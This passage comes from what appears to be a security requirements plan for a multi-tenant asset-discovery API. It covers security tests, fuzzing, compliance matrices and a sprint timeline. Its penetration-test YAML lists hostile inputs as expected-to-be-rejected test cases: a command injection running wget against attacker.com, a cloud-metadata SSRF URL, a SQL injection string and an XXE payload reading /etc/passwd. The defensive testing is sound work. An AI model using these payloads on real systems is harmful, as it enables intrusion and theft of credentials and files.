
```python
# tests/test_security_integration.py
import httpx
import pytest
from fastapi.testclient import TestClient

class TestAPISecurityIntegration:
    """Integration tests for API security"""

    @pytest.fixture
    def client(self):
        from app.main import app
        return TestClient(app)

    def test_rate_limiting(self, client):
        """Test rate limiting works"""
        # Make requests up to limit
        for _ in range(100):
            response = client.get("/api/v1/assets")
            assert response.status_code == 200

        # Next request should be rate limited
        response = client.get("/api/v1/assets")
        assert response.status_code == 429

    def test_cors_headers(self, client):
        """Test CORS headers are present"""
        response = client.options(
            "/api/v1/assets",
            headers={"Origin": "https://app.example.com"}
        )
        assert "Access-Control-Allow-Origin" in response.headers
        assert response.headers["Access-Control-Allow-Origin"] != "*"

    def test_security_headers(self, client):
        """Test security headers are set"""
        response = client.get("/api/v1/health")

        required_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy"
        ]

        for header in required_headers:
            assert header in response.headers

    def test_tenant_isolation(self, client):
        """Test cross-tenant access is blocked"""
        # Login as tenant A
        token_a = self.get_token(client, "tenant_a")

        # Try to access tenant B's resources
        response = client.get(
            "/api/v1/tenants/2/assets",
            headers={"Authorization": f"Bearer {token_a}"}
        )

        assert response.status_code == 403
        assert "Cross-tenant access violation" in response.json()["detail"]
```

### 5.3 Penetration Testing Scenarios

```yaml
# penetration_tests.yaml
penetration_tests:
  - name: "Command Injection via Domain Input"
    endpoint: "/api/v1/discovery/start"
    method: "POST"
    payload:
      domain: "example.com; wget http://attacker.com/shell.sh"
    expected_status: 400
    expected_response: "Invalid domain"

  - name: "SSRF via Katana Crawler"
    endpoint: "/api/v1/tools/katana"
    method: "POST"
    payload:
      url: "http://169.254.169.254/latest/meta-data/"
    expected_status: 400
    expected_response: "Blocked URL"

  - name: "JWT Token Manipulation"
    endpoint: "/api/v1/profile"
    method: "GET"
    headers:
      Authorization: "Bearer MANIPULATED_TOKEN"
    expected_status: 401
    expected_response: "Invalid token"

  - name: "SQL Injection in Search"
    endpoint: "/api/v1/assets/search"
    method: "GET"
    params:
      q: "' OR '1'='1"
    expected_status: 400
    expected_response: "Invalid search query"

  - name: "XXE in XML Upload"
    endpoint: "/api/v1/upload"
    method: "POST"
    content_type: "application/xml"
    payload: |
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <data>&xxe;</data>
    expected_status: 400
    expected_response: "XML not supported"
```

### 5.4 Fuzzing Requirements

```python
# tests/test_fuzzing.py
from hypothesis import given, strategies as st
import atheris

class FuzzingTests:
    """Fuzzing tests for security-critical functions"""

    @given(st.text())
    def test_fuzz_domain_validator(self, domain):
        """Fuzz test domain validator"""
        try:
            DomainValidator.validate_domain(domain)
        except Exception as e:
            # Should handle gracefully, not crash
            assert isinstance(e, (ValueError, ToolExecutionError))

    @atheris.instrument_func
    def test_fuzz_secure_executor(data):
        """Fuzz test SecureToolExecutor"""
        fdp = atheris.FuzzedDataProvider(data)

        executor = SecureToolExecutor(tenant_id=1)

        # Generate random inputs
        tool = fdp.ConsumeString(50)
        args = [fdp.ConsumeString(100) for _ in range(fdp.ConsumeIntInRange(0, 10))]

        try:
            executor.validate_tool(tool)
            executor.sanitize_args(args)
        except ToolExecutionError:
            # Expected for invalid inputs
            pass
```

## 6. Compliance Considerations

### 6.1 OWASP Top 10 Compliance Matrix

| OWASP Category | Status | Implementation | Evidence |
|----------------|---------|----------------|-----------|
| A01: Broken Access Control | ✅ | JWT + RBAC + Tenant Isolation | TenantIsolation class |
| A02: Cryptographic Failures | ✅ | Strong encryption, no hardcoded secrets | SecretManager class |
| A03: Injection | ✅ | Input validation, parameterized queries | DomainValidator, SecureToolExecutor |
| A04: Insecure Design | ✅ | Threat modeling, security by design | This document |
| A05: Security Misconfiguration | ✅ | Secure defaults, configuration validation | SecureSettings class |
| A06: Vulnerable Components | ✅ | Checksum validation, dependency scanning | Dockerfile improvements |
| A07: Authentication Failures | ✅ | Strong JWT, MFA ready | JWTManager class |
| A08: Data Integrity Failures | ✅ | Checksum validation, signed tokens | Binary verification |
| A09: Logging Failures | ✅ | Comprehensive audit logging | AuditLogger class |
| A10: SSRF | ✅ | URL validation, network isolation | KatanaSafetyNet class |

### 6.2 CIS Benchmark Alignment

```yaml
cis_controls:
  - control: "CIS 1.1"
    description: "Inventory and Control of Enterprise Assets"
    implementation: "Asset discovery and tracking system"
    status: "Compliant"

  - control: "CIS 3.3"
    description: "Configure Data Access Control Lists"
    implementation: "Tenant-based access control"
    status: "Compliant"

  - control: "CIS 4.1"
    description: "Establish Secure Configuration Process"
    implementation: "SecureSettings with validation"
    status: "Compliant"

  - control: "CIS 6.1"
    description: "Establish Access Granting Process"
    implementation: "JWT with RBAC"
    status: "Compliant"

  - control: "CIS 8.2"
    description: "Collect Audit Logs"
    implementation: "Comprehensive audit logging"
    status: "Compliant"
```

### 6.3 GDPR Considerations

```python
# app/security/gdpr.py
class GDPRCompliance:
    """GDPR compliance utilities"""

    @staticmethod
    def anonymize_pii(data: dict) -> dict:
        """Anonymize personally identifiable information"""
        pii_fields = ['email', 'ip_address', 'name', 'phone']

        for field in pii_fields:
            if field in data:
                data[field] = hashlib.sha256(
                    data[field].encode()
                ).hexdigest()[:8] + "****"

        return data

    @staticmethod
    def get_data_retention_policy() -> dict:
        """Define data retention periods"""
        return {
            'audit_logs': 90,  # days
            'scan_results': 180,
            'user_data': 365,
            'telemetry': 30,
        }

    @staticmethod
    def export_user_data(user_id: str) -> dict:
        """Export all user data (GDPR right to portability)"""
        # Implementation for data export
        pass

    @staticmethod
    def delete_user_data(user_id: str) -> bool:
        """Delete all user data (GDPR right to erasure)"""
        # Implementation for data deletion
        pass
```

## 7. Security Metrics and KPIs

### 7.1 Security Metrics Dashboard

```python
# app/security/metrics.py
from dataclasses import dataclass
from typing import Dict, List

@dataclass
class SecurityMetrics:
    """Security metrics tracking"""

    # Vulnerability metrics
    critical_vulns: int = 0
    high_vulns: int = 0
    medium_vulns: int = 0
    low_vulns: int = 0

    # Coverage metrics
    input_validation_coverage: float = 0.0
    api_auth_coverage: float = 100.0
    encryption_coverage: float = 100.0

    # Operational metrics
    failed_auth_attempts: int = 0
    blocked_attacks: int = 0
    mean_time_to_detect: float = 0.0
    mean_time_to_respond: float = 0.0

    # Compliance metrics
    owasp_compliance: float = 100.0
    cis_compliance: float = 95.0

    def calculate_security_score(self) -> float:
        """Calculate overall security score"""
        score = 10.0

        # Deduct for vulnerabilities
        score -= self.critical_vulns * 1.0
        score -= self.high_vulns * 0.5
        score -= self.medium_vulns * 0.2
        score -= self.low_vulns * 0.05

        # Factor in coverage
        score *= (self.input_validation_coverage / 100)
        score *= (self.api_auth_coverage / 100)

        return max(0, min(10, score))
```

### 7.2 Target Metrics

| Metric | Current | Target | Deadline |
|--------|---------|--------|----------|
| Security Score | 7.5 | 9.0 | Sprint 2 End |
| Critical Vulnerabilities | 3 | 0 | Sprint 2 Mid |
| Input Validation Coverage | 60% | 100% | Sprint 2 End |
| API Authentication Coverage | 70% | 100% | Sprint 2 Mid |
| Audit Log Coverage | 80% | 100% | Sprint 2 End |
| MTTD (Mean Time To Detect) | 15 min | 5 min | Sprint 3 |
| MTTR (Mean Time To Respond) | 60 min | 15 min | Sprint 3 |

## 8. Timeline and Deliverables

### Week 1 (Days 1-5)

**Day 1-2: Critical Vulnerability Fixes**
- [ ] Fix binary checksum validation (4h)
- [ ] Implement domain input validation (6h)
- [ ] Remove hardcoded secrets (3h)
- [ ] Write and run security tests (3h)

**Day 3-4: Tool Security Implementation**
- [ ] Implement HTTPx security wrapper (4h)
- [ ] Configure Naabu rate limiting (3h)
- [ ] Add TLSx certificate validation (3h)
- [ ] Implement Katana SSRF prevention (4h)
- [ ] Integration testing (2h)

**Day 5: API Security**
- [ ] Implement JWT authentication (4h)
- [ ] Configure rate limiting (2h)
- [ ] Add security headers (1h)
- [ ] Test API security (1h)

### Week 2 (Days 6-10)

**Day 6-7: Multi-tenant Security**
- [ ] Implement tenant isolation (4h)
- [ ] Add cross-tenant validation (3h)
- [ ] Implement audit logging (3h)
- [ ] Test tenant isolation (2h)
- [ ] Document API endpoints (4h)

**Day 8: Security Testing**
- [ ] Run penetration tests (4h)
- [ ] Execute fuzzing tests (2h)
- [ ] Performance testing with security (2h)

**Day 9: Compliance and Documentation**
- [ ] Complete OWASP compliance check (2h)
- [ ] Document CIS alignment (2h)
- [ ] Update security policies (2h)
- [ ] Create incident response plan (2h)

**Day 10: Final Validation**
- [ ] Security score assessment (2h)
- [ ] Final penetration test (3h)
- [ ] Sign-off preparation (2h)
- [ ] Deployment checklist (1h)

## 9. Security Checklist for Sprint 2

### Pre-Development
- [ ] Threat model reviewed and approved
- [ ] Security requirements documented
- [ ] Secure coding guidelines distributed
- [ ] Development environment secured

### During Development
- [ ] Input validation on all endpoints
- [ ] No hardcoded secrets
- [ ] Secure error handling
- [ ] Audit logging implemented
- [ ] Rate limiting configured
- [ ] Security headers added

### Pre-Deployment
- [ ] Security unit tests passing
- [ ] Integration security tests passing
- [ ] Penetration testing completed
- [ ] Vulnerability scan clean
- [ ] Dependency scan clean
- [ ] Code review completed
- [ ] Security documentation updated

### Post-Deployment
- [ ] Security monitoring enabled
- [ ] Incident response team notified
- [ ] Security metrics baseline established
- [ ] First 24-hour security review scheduled

## Conclusion

This comprehensive security requirement document provides the foundation for achieving a security score of 9.0/10 by the end of Sprint 2. The critical vulnerabilities must be addressed immediately (within the first 2 days), followed by systematic implementation of security controls for the new tools and API endpoints.

Key success factors:
1. Fix all 3 critical vulnerabilities by Day 2
2. Achieve 100% input validation coverage
3. Implement comprehensive API security
4. Maintain complete tenant isolation
5. Establish real-time threat detection

The security work represents approximately 40% of the sprint capacity, which is appropriate given the critical nature of the platform and the introduction of new attack surfaces with the additional tools.